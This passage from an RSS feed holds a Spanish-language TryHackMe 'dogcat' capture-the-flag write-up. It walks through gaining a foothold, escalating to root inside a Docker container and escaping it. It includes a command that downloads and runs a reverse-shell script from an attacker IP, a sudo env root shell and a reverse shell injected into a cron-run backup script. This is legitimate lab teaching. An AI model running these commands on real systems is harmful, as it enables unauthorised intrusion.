&lt;/div&gt;&lt;p&gt;Vemos que en la respuesta tenemos acceso como usuario &lt;code&gt;www-data&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.38.25.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;user---www-data--docker-&#34;&gt;USER - WWW-DATA [ DOCKER ]&lt;/h1&gt;
&lt;p&gt;Ahora, creamos un archivo que contenga una shell inversa para descargarlo mediante un servidor de python (python3 -m http.server 80) en la maquina.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Comando para descargar y ejecutar nuestra shell (Codificamos a URL los espacios)&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;bash -c  &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;curl -s 10.8.6.160/shell.sh&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;#Codificado&lt;/span&gt;
bash%20-c%20%20&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;curl%20-s%2010.8.6.160/shell.sh&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Logramos obtener una shell con el usuario www-data.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.07.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nuestra segunda flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.08.02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation---docker&#34;&gt;PRIVILEGE ESCALATION - DOCKER&lt;/h1&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos root (sudo) para ejecutar el comando &lt;code&gt;env&lt;/code&gt;. Utilizamos env para obtener una shell root.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.11.00.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo /usr/bin/env /bin/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Òbtenemos nuestra shell como usuario root y nuestra tercera flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.11.22.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;escaping-docker&#34;&gt;ESCAPING DOCKER&lt;/h1&gt;
&lt;p&gt;Tenemos privilegio root pero vemos que estamos limitados de comandos y vemos en la raiz de la maquina que existe un archivo &lt;code&gt;.dockerenv&lt;/code&gt; por lo que en el lugar que estamos es un contenedor.&lt;/p&gt;
&lt;p&gt;Dentro de la carpeta &lt;code&gt;/opt/backup&lt;/code&gt; encontramos una carpeta que contiene dos archivos un bash y un tar, los cuales se utilizaron para crear el contenedor (backup.tar), vemos que el archivo bash descomprimer el archivo tar dentro de /root/container. Agregamos un ping hacia nuestra maquina en el archivo y logramos obtener paquetes en tcpdump.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.01.03.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TCPDUMP&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.01.41.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Podemos deducir que existe un crontab que ejecuta el archibo backup.sh, ahora, agregamos una shell inversa a este archivo y ponemos a la escucha netcat en nuestra maquina y esperamos a que nos devuelva una shell.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SHELL&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.05.30.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NETCAT&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.06.08.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener una shell y nuestra ultima flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.07.36.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Crontab del archivo backup.sh&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.09.40.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/dogcat/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/dogcat/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>lfi</category>
            
          
            
              <category>cron</category>
            
          
            
              <category>docker</category>
            
          
            
              <category>lfi poisoning</category>
            
          
            
              <category>wrappers</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>